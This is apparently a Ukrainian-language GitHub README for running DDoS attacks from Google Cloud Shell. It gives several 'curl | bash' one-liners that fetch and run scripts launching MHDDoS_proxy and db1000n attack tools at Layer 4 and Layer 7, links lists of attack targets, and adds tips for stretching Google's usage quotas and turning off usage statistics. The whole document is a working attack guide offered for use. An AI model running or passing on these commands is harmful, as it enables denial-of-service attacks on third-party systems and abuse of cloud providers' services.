## DDoS whith Google Cloud Shell
#### Scripts for durable cloudshell session. Test!
#
### Використовуємо https://shell.cloud.google.com/?fromcloudshell=true&show=terminal
#
### Команди для встановлення та запуску MHDDoS_proxy
:white_check_mark:**Layer7:**
```
curl -l https://raw.githubusercontent.com/Operation-Stop-russia/Gcloudshell_ddos/main/Start_L7m.sh | bash
```
:grey_question:**Layer4:**    
~~`curl -l https://raw.githubusercontent.com/Operation-Stop-russia/Gcloudshell_ddos/main/Start_L4.sh | bash`~~    
```
curl -l https://raw.githubusercontent.com/Operation-Stop-russia/Gcloudshell_ddos/main/L4_tcp.sh | bash
```
:white_check_mark:***--itarmy*:**    
```
curl -l https://raw.githubusercontent.com/Operation-Stop-russia/Gcloudshell_ddos/main/itarmy.sh | bash
```
:grey_question:**All targets:**    
```
curl -l https://raw.githubusercontent.com/Operation-Stop-russia/Gcloudshell_ddos/main/ALL.sh | bash
```
:grey_question:**Розділений термінал (Layer7+Layer4):**    
```
curl -l https://raw.githubusercontent.com/Operation-Stop-russia/Gcloudshell_ddos/main/Start_dualShell.sh | bash
```    
#
### :white_check_mark: Команда для встановлення та запуску db1000n 
```
curl -l https://raw.githubusercontent.com/Operation-Stop-russia/Gcloudshell_ddos/main/db1000n_GShell.sh | bash
``` 
#
:exclamation:• У [Google Cloud Shell](https://shell.cloud.google.com/?fromcloudshell=true&show=terminal) в налаштуваннях бажано **вимкнути статистику використання**.    
:exclamation:• **Рекомендується використовувати 1 термінал на акаунт**.    
:exclamation:• Максимальна тривалість сеансу Cloud Shell - 12 годин. Новий сеанс можна почати одразу після розриву.    
:exclamation:• Враховуйте, що встановлені тижневі квоти на використання, 1 акаунт - 50 годин у звичайному режимі та 50 годин у ефемерному режимі (*до закінчення квоти у звичайному режимі - вмикаємо Ephemeral Mode (ставимо - "Завжди") та отримуємо ще 50 годин використання на поточний тиждень*)    
• **Для скидання Cloud Shell** - Видаліть усі файли з домашнього каталогу, команда: `sudo rm -rf $HOME`, далі - у меню Cloud Shell клацніть значок меню з трьома крапками, а потім натисніть "Restart" *(Буде надано нову віртуальну машину, а домашній каталог буде відновлено до стану за замовчуванням)*
#
#
#### Списки з цілями
https://raw.githubusercontent.com/Operation-Stop-russia/targets_lists/main/L7m.lst    
https://raw.githubusercontent.com/Operation-Stop-russia/targets_lists/main/L4_tcp.lst
https://raw.githubusercontent.com/Operation-Stop-russia/targets_lists/main/AllTargets.lst
#
#
[IT ARMY of Ukraine](https://t.me/itarmyofukraine2022)
